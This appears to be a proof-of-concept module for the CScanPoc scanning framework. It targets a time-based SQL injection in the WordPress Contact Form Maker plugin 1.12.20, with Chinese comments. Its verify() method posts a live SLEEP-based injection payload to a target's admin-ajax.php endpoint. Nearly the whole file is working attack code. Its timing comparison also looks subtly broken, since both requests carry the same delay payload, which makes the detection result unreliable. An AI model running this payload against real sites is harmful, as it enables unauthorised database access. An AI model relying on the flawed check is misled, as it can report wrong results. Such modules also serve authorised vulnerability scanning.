
# coding:utf-8
import time
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WordPress_0142'  # 平台漏洞编号
    name = 'WordPress Contact Form Maker Plugin 1.12.20 - SQL Injection'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2018-06-07'  # 漏洞公布时间
    desc = '''
    WordPress是一个基于PHP和MySQL的免费开源内容管理系统（CMS）。功能包括插件架构和模板系统。它与博客最相关，但支持其他类型的网络内容，包括更传统的邮件列表和论坛，媒体画廊和在线商店。截至2018年4月，超过6000万个网站使用，包括前1000万个网站的30.6％，WordPress是最受欢迎的网站管理系统正在使用中。WordPress也被用于其他应用领域，如普适显示系统（PDS）。
    WordPress Contact Form Maker Plugin 1.12.20 - SQL Injection.
    WordPress联系人表单制作插件1.12.20 - SQL注入。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/44854/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞组件名称
    product_version = '1.12.20'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b4171f1e-d7db-43b8-8e6b-b167f62e305e'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + \
                '/wp-admin/admin-ajax.php?action=FormMakerSQLMapping_fmc&task=db_table_struct'
            timeout = 5
            start_time = time.time()

            payload = {
                'name': "wp_users WHERE 42=42 AND SLEEP({})--;".format(timeout)
            }
            _response = requests.post(url, data=payload)
            
            end_time1 = time.time()
            
            payload1 = {
                'name': "wp_users WHERE 42=42 AND SLEEP(5)--;"
            }
            _response = requests.post(url, data=payload1)
            end_time2 = time.time()

            if  (end_time2-end_time1)-(end_time1-start_time) >= timeout:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
